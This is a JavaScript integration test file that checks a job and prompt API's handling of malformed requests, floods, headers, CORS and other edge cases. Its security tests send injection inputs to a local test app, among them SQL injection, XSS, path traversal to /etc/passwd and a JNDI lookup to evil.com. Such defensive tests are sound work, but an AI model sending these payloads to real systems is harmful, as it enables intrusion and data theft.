// Integration tests for API error handling scenarios

import { test, expect, beforeEach, afterEach, describe } from 'bun:test';
import { 
  createTestApp, 
  createTestFetch, 
  wait,
  assertResponseError,
  getResponseJson,
  createTestJobs
} from '../setup.js';

describe('API Error Handling', () => {
  let app, fetch, services;

  beforeEach(() => {
    const testSetup = createTestApp();
    app = testSetup.app;
    services = testSetup.services;
    fetch = createTestFetch(app);
  });

  afterEach(async () => {
    // Clean up running jobs
    if (services && services.jobService) {
      const jobs = await services.storage.listJobs();
      for (const job of jobs) {
        if (job.status === 'running') {
          try {
            await services.jobService.terminateJob(job.id);
          } catch (error) {
            // Ignore cleanup errors
          }
        }
      }
      await wait(50);
      await services.storage.clear();
    }
  });

  describe('malformed requests', () => {
    test('should handle invalid JSON in request body', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{ invalid json'
      });

      await assertResponseError(response, 400);
      const data = await getResponseJson(response);
      expect(data.error).toBeDefined();
    });

    test('should handle missing Content-Type header', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        body: JSON.stringify({ prompt: 'Test' })
      });

      // Should still work or return appropriate error
      expect([200, 400, 415].includes(response.status)).toBe(true);
    });

    test('should handle empty request body', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: ''
      });

      await assertResponseError(response, 400);
    });

    test('should handle null request body', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'null'
      });

      await assertResponseError(response, 400);
    });

    test('should handle request body with wrong type', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '"just a string"'
      });

      await assertResponseError(response, 400);
    });
  });

  describe('invalid parameters', () => {
    test('should handle invalid job ID format in URL', async () => {
      const invalidIds = [
        'job/../../../etc/passwd',
        'job with spaces',
        'job\nwith\nnewlines',
        'job\x00with\x00nulls',
        'job%2F..%2F..%2Fetc%2Fpasswd',
        'extremely-long-job-id-'.repeat(100)
      ];

      for (const invalidId of invalidIds) {
        const response = await fetch(`/jobs/${encodeURIComponent(invalidId)}`);
        await assertResponseError(response, 404);
      }
    });

    test('should handle invalid query parameters', async () => {
      // Test various invalid status values
      const invalidStatuses = ['invalid', '123', 'null', 'undefined', 'running;DROP TABLE jobs;'];
      
      for (const status of invalidStatuses) {
        const response = await fetch(`/jobs?status=${encodeURIComponent(status)}`);
        // Should either ignore invalid status or return error
        expect([200, 400].includes(response.status)).toBe(true);
      }
    });

    test('should handle extremely large query parameters', async () => {
      const largeParam = 'a'.repeat(10000);
      
      const response = await fetch(`/jobs?status=${largeParam}`);
      expect([200, 400, 414].includes(response.status)).toBe(true); // 414 = URI Too Long
    });

    test('should handle invalid since parameter in stream endpoint', async () => {
      const { jobId } = await services.jobService.createJob('Stream test');
      
      const invalidSinceValues = [
        'not-a-number',
        '-1',
        'null',
        'undefined',
        '99999999999999999999999999999999999999',
        'Infinity',
        'NaN'
      ];

      for (const since of invalidSinceValues) {
        const response = await fetch(`/jobs/${jobId}/stream?since=${since}`);
        // Should either ignore invalid since or return error
        expect([200, 400].includes(response.status)).toBe(true);
      }
    });
  });

  describe('HTTP method errors', () => {
    test('should handle unsupported HTTP methods', async () => {
      const unsupportedMethods = ['PATCH', 'PUT', 'HEAD', 'TRACE'];
      
      for (const method of unsupportedMethods) {
        const response = await fetch('/prompt', { method });
        expect([405, 501].includes(response.status)).toBe(true); // Method Not Allowed or Not Implemented
      }
    });

    test('should handle wrong HTTP method for endpoints', async () => {
      // POST endpoint called with GET
      const response1 = await fetch('/prompt', { method: 'GET' });
      await assertResponseError(response1, 405);
      
      // GET endpoint called with POST
      const response2 = await fetch('/jobs', { method: 'POST' });
      await assertResponseError(response2, 405);
    });
  });

  describe('rate limiting and resource exhaustion', () => {
    test('should handle rapid-fire requests', async () => {
      // Use a smaller batch to be more realistic about server capacity
      const promises = Array(20).fill(null).map(() => 
        fetch('/health').then(r => r.status)
      );
      
      const results = await Promise.all(promises);
      
      // Server should handle at least some requests gracefully
      // In resource exhaustion scenarios, some failures are expected
      const successes = results.filter(status => status === 200);
      const validResponses = results.filter(status => [200, 503, 429].includes(status));
      
      // Either get some successes OR get proper error codes (not network failures)
      expect(successes.length > 5 || validResponses.length >= results.length * 0.8).toBe(true);
    });

    test('should handle concurrent job creation flood', async () => {
      const promises = Array(50).fill(null).map((_, i) => 
        fetch('/prompt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ prompt: `Flood test ${i}` })
        }).then(r => ({ status: r.status, ok: r.ok }))
      );
      
      const results = await Promise.all(promises);
      
      // Most should succeed
      const successes = results.filter(r => r.ok);
      expect(successes.length).toBeGreaterThan(40); // At least 80% should succeed
      
      // If any failed, they should fail gracefully
      const failures = results.filter(r => !r.ok);
      failures.forEach(failure => {
        expect([400, 429, 500, 503].includes(failure.status)).toBe(true);
      });
    });
  });

  describe('batch endpoint error handling', () => {
    test('should handle batch with invalid prompt types', async () => {
      const response = await fetch('/batch', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          prompts: ['valid prompt', 123, null, undefined, {}]
        })
      });

      await assertResponseError(response, 400);
      const data = await getResponseJson(response);
      expect(data.error).toMatch(/(prompts|Prompt)/i);
    });

    test('should handle batch with mixed valid/invalid prompts', async () => {
      const response = await fetch('/batch', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          prompts: [
            'valid prompt 1',
            '', // Empty but valid
            'valid prompt 2',
            null, // Invalid
            'valid prompt 3'
          ]
        })
      });

      await assertResponseError(response, 400);
    });

    test('should handle batch status request with invalid job IDs', async () => {
      const invalidIds = 'invalid,job,ids,that,do,not,exist';
      
      const response = await fetch(`/batch/${invalidIds}/status`);
      
      // Should return results even if jobs don't exist
      expect([200, 404].includes(response.status)).toBe(true);
      
      if (response.status === 200) {
        const data = await getResponseJson(response);
        expect(data.jobs).toBeDefined();
      }
    });

    test('should handle batch termination with mix of valid/invalid IDs', async () => {
      // Create one valid job
      const { jobId } = await services.jobService.createJob('Batch test');
      await wait(50); // Let it start
      
      const mixedIds = `${jobId},invalid-id-1,invalid-id-2`;
      
      const response = await fetch(`/batch/${mixedIds}/terminate`, {
        method: 'POST'
      });
      
      // Should handle partial success
      expect([200, 207, 400].includes(response.status)).toBe(true);
    });
  });

  describe('system endpoint error handling', () => {
    test('should handle health check when service unavailable', async () => {
      // Health check should still work even if some services are down
      const response = await fetch('/health?services=true');
      
      // Should return something even if degraded
      expect([200, 503].includes(response.status)).toBe(true);
      
      const data = await getResponseJson(response);
      expect(data.status).toBeDefined();
      expect(['healthy', 'degraded', 'unhealthy'].includes(data.status)).toBe(true);
    });

    test('should handle stats when no data available', async () => {
      const response = await fetch('/stats');
      
      expect(response.status).toBe(200);
      const data = await getResponseJson(response);
      
      expect(data.totalJobs).toBeDefined();
      expect(data.jobsByStatus).toBeDefined();
      expect(data.memoryUsage).toBeDefined();
    });

    test('should handle cleanup errors gracefully', async () => {
      const response = await fetch('/cleanup', {
        method: 'POST'
      });
      
      expect(response.status).toBe(200);
      const data = await getResponseJson(response);
      
      expect(data.cleaned).toBeDefined();
      expect(typeof data.cleaned).toBe('number');
    });
  });

  describe('header and encoding edge cases', () => {
    test('should handle requests with unusual headers', async () => {
      const response = await fetch('/health', {
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; TestBot/1.0)',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'X-Custom-Header': 'custom-value',
          'X-Very-Long-Header': 'x'.repeat(8000)
        }
      });
      
      // Server may reject extremely large headers
      expect([200, 400, 413, 503].includes(response.status)).toBe(true);
    });

    test('should handle requests with Unicode in JSON', async () => {
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify({ 
          prompt: '测试 Unicode: 🚀 🎨 💻 αβγδε العربية プロジェクト' 
        })
      });
      
      expect([200, 400].includes(response.status)).toBe(true);
      
      if (response.status === 200) {
        const data = await getResponseJson(response);
        expect(data.jobId).toMatch(/^job_\d+_[a-z0-9]+$/);
      }
    });

    test('should handle malformed UTF-8 sequences', async () => {
      // This is tricky to test with fetch API, but we can try
      const response = await fetch('/prompt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          prompt: 'Test with replacement char: \uFFFD' 
        })
      });
      
      expect([200, 400].includes(response.status)).toBe(true);
    });
  });

  describe('timeout and long-running operation errors', () => {
    test('should handle request timeout scenarios', async () => {
      // Create a long-running job and immediately query it
      const { jobId } = await services.jobService.createJob('Perform a long complex task');
      
      // Multiple rapid requests for the same job
      const promises = Array(10).fill(null).map(() => 
        fetch(`/jobs/${jobId}`)
      );
      
      const responses = await Promise.all(promises);
      
      // All should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
    });

    test('should handle stream requests during job lifecycle', async () => {
      const { jobId } = await services.jobService.createJob('Stream lifecycle test');
      
      // Immediate stream request
      const response1 = await fetch(`/jobs/${jobId}/stream`);
      expect(response1.status).toBe(200);
      
      await wait(100);
      
      // Stream request during execution
      const response2 = await fetch(`/jobs/${jobId}/stream`);
      expect(response2.status).toBe(200);
      
      // Wait for completion
      let attempts = 0;
      while (attempts < 50) {
        const job = await services.jobService.getJob(jobId);
        if (job && (job.status === 'completed' || job.status === 'failed')) {
          break;
        }
        await wait(50);
        attempts++;
      }
      
      // Stream request after completion
      const response3 = await fetch(`/jobs/${jobId}/stream`);
      expect(response3.status).toBe(200);
    });
  });

  describe('CORS and security edge cases', () => {
    test('should handle preflight requests with unusual origins', async () => {
      const unusualOrigins = [
        'http://localhost:3000',
        'https://app.example.com',
        'null',
        'file://',
        'chrome-extension://abcdef',
        'moz-extension://123456'
      ];
      
      for (const origin of unusualOrigins) {
        const response = await fetch('/prompt', {
          method: 'OPTIONS',
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'Content-Type'
          }
        });
        
        expect(response.status).toBe(204);
        expect(response.headers.get('Access-Control-Allow-Origin')).toBe('*');
      }
    });

    test('should handle requests with potential injection attempts', async () => {
      const maliciousInputs = [
        '"; DROP TABLE jobs; --',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/x}',
        '../../../etc/passwd',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '\\x00\\x01\\x02',
        '<?php phpinfo(); ?>',
        'SELECT * FROM users WHERE id = 1 OR 1=1'
      ];
      
      for (const malicious of maliciousInputs) {
        const response = await fetch('/prompt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ prompt: malicious })
        });
        
        // Should handle safely (either accept and sanitize, or reject)
        expect([200, 400].includes(response.status)).toBe(true);
        
        if (response.status === 200) {
          const data = await getResponseJson(response);
          expect(data.jobId).toMatch(/^job_\d+_[a-z0-9]+$/);
        }
      }
    });
  });

  describe('error response format consistency', () => {
    test('should return consistent error format across endpoints', async () => {
      const errorRequests = [
        { url: '/prompt', method: 'POST', body: '{}' },
        { url: '/jobs/nonexistent', method: 'GET' },
        { url: '/jobs/nonexistent', method: 'DELETE' },
        { url: '/jobs/nonexistent/terminate', method: 'POST' },
        { url: '/batch/nonexistent/status', method: 'GET' }
      ];
      
      for (const request of errorRequests) {
        const response = await fetch(request.url, {
          method: request.method,
          headers: { 'Content-Type': 'application/json' },
          body: request.body
        });
        
        if (!response.ok) {
          const data = await getResponseJson(response);
          
          // All errors should have an error field
          expect(data).toHaveProperty('error');
          expect(typeof data.error).toBe('string');
          expect(data.error.length).toBeGreaterThan(0);
          
          // Optional timestamp
          if (data.timestamp) {
            expect(typeof data.timestamp).toBe('number');
          }
        }
      }
    });
  });
});